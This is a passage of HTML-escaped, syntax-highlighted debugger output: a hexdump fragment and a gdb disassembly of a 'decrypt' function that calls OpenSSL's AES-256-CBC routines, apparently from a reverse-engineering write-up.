#268BD2&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;d3&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;36&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;......l..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;....6&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0020&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ec&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;e1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;bc&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;f4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;p&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.i....&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a_.&lt;/span&gt;

&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x08048b0b&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;decrypt&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;di&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sass&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;decrypt&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ac8&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ac9&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048acb&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x38&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ace&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0x80487e0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EVP_CIPHER_CTX_new@plt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ad3&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ad6&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ada&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048ae1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;decrypt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048adc&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0x80489ec&lt;/span&gt; 
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ae1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0x80488a0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EVP_aes_256_cbc@plt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ae6&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048ae9&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;33&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048aed&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048af0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048af4&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048afc&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b00&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;56&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b03&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b06&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048830&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex@plt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b0b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x1&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b0e&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048b15&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;decrypt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b10&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0x80489ec&lt;/span&gt; 
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b15&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b18&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b1c&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
